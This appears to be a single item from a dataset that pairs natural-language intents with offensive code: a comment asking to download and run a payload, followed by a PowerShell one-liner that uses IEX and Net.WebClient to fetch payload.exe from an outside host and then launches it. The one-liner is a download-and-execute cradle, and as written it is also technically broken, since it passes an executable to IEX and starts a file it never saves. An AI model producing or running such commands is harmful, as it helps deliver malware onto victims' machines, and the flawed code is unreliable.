# Natural language intent:
# Download a payload from a specified URL and execute it using PowerShell.

IEX (New-Object Net.WebClient).DownloadString('http://source.com/payload.exe'); Start-Process payload.exe;
